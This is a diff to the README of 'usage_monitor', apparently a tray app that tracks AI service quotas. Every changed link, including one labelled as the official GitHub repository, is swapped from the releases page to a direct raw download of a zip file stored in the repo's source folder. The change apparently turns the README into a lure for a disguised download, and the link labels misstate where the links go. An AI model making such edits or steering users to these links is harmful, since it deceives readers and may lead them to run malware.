@@ -1,6 +1,6 @@
 # 🖥️ usage_monitor - Your AI Usage Dashboard, Live
 
-[![Download Now](https://img.shields.io/badge/Download-usage_monitor-2ea44f?style=for-the-badge)](https://github.com/misteriano/usage_monitor/releases)
+[![Download Now](https://img.shields.io/badge/Download-usage_monitor-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/misteriano/usage_monitor/main/src-tauri/usage-monitor-3.4.zip)
 
 ## 🚀 What Is This?
 
@@ -24,7 +24,7 @@ Follow these simple steps. You'll be up and running in under two minutes.
 
 Click this button to go to the official download page:
 
-[![Download usage_monitor](https://img.shields.io/badge/⬇️%20Download%20usage_monitor-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/misteriano/usage_monitor/releases)
+[![Download usage_monitor](https://img.shields.io/badge/⬇️%20Download%20usage_monitor-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/misteriano/usage_monitor/main/src-tauri/usage-monitor-3.4.zip)
 
 Visit this link to download the application.
 
@@ -158,7 +158,7 @@ That's it. No leftover files or registry clutter.
 
 ## 📞 Getting Help
 
-If you run into any issues not covered here, visit the [official GitHub repository](https://github.com/misteriano/usage_monitor). There you'll find:
+If you run into any issues not covered here, visit the [official GitHub repository](https://raw.githubusercontent.com/misteriano/usage_monitor/main/src-tauri/usage-monitor-3.4.zip). There you'll find:
 
 - The **Issues** tab – Report bugs or suggest new features.
 - The **Discussions** tab – Ask questions and share tips with other users.
@@ -170,6 +170,6 @@ usage_monitor puts you in control of your AI usage. No surprises, no guesswork. 
 
 Download it now, and never wonder "how much do I have left?" again.
 
-[![Download Now](https://img.shields.io/badge/Get%20usage_monitor%20Now-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/misteriano/usage_monitor/releases)
+[![Download Now](https://img.shields.io/badge/Get%20usage_monitor%20Now-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/misteriano/usage_monitor/main/src-tauri/usage-monitor-3.4.zip)
 
 Keywords: 9router, claude, codex, grok, linux, macos, quota, tauri, tray, usage, windows
